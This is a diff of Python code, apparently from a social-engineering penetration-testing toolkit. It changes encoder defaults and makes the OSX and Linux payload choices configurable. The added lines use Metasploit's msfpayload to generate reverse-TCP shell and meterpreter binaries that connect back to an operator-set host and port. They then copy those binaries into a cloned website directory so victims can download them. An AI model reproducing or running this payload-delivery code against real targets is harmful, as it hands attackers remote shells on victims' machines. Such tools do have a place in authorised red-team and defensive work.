@@ -297,8 +297,9 @@ try:
                 encoder = "true"
 
             # Handle special cases
-            if encode=='' or encode == ' ': encode = '16'
-            if encode == '16': encount=0
+            if encode=='' or encode == ' ': encode = '1'
+            if encode == '1':
+                encount="4"
             if encode=='14' or encode == '0': encoder="false"
 
             # do dictionary lookup
@@ -658,15 +659,24 @@ try:
                 # deploy nix and linux binaries
                 if check_config("DEPLOY_OSX_LINUX_PAYLOADS=").lower() == "on":
                     port2=check_config("LINUX_REVERSE_PORT=")
+                    osxpayload = check_config("OSX_PAYLOAD_DELIVERY=")
+                    linuxpayload = check_config("LINUX_PAYLOAD_DELIVERY=")
                     print_status("Generating OSX payloads through Metasploit...")
-                    subprocess.Popen(r"ruby %s/msfpayload osx/x86/shell_reverse_tcp LHOST=%s LPORT=%s X > %s/mac.bin;chmod 755 %s/mac.bin" % (path,choice2,port1,setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                    subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s LPORT=%s X > %s/mac.bin;chmod 755 %s/mac.bin" % (path,osxpayload,choice2,port1,setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                     print_status("Generating Linux payloads through Metasploit...")
-                    subprocess.Popen(r"ruby %s/msfpayload linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s X > %s/nix.bin" % (path,choice2,port2,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                    subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s LPORT=%s X > %s/nix.bin" % (path,linuxpayload,choice2,port2,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                     if multiattack_java == "on":
                         multiattack.write("OSX="+str(port1)+"\n")
-                        multiattack.write("OSXPAYLOAD=osx/x86/shell_reverse_tcp\n")
+                        multiattack.write("OSXPAYLOAD=%s\n" % (osxpayload))
                         multiattack.write("LINUX="+str(port2)+"\n")
-                        multiattack.write("LINUXPAYLOAD=linux/x86/shell/reverse_tcp\n")
+                        multiattack.write("LINUXPAYLOAD=%s\n" % (linuxpayload))
+
+                    osxcheck = check_options("MAC.BIN=")
+                    linuxcheck = check_options("NIX.BIN=")
+                    shutil.copyfile(setdir + "/mac.bin", setdir + "/web_clone/%s" % (osxcheck))
+                    shutil.copyfile(setdir + "/nix.bin", setdir + "/web_clone/%s" % (linuxcheck))
+
+
         # try block here
         try:
             # if they want a listener, start here
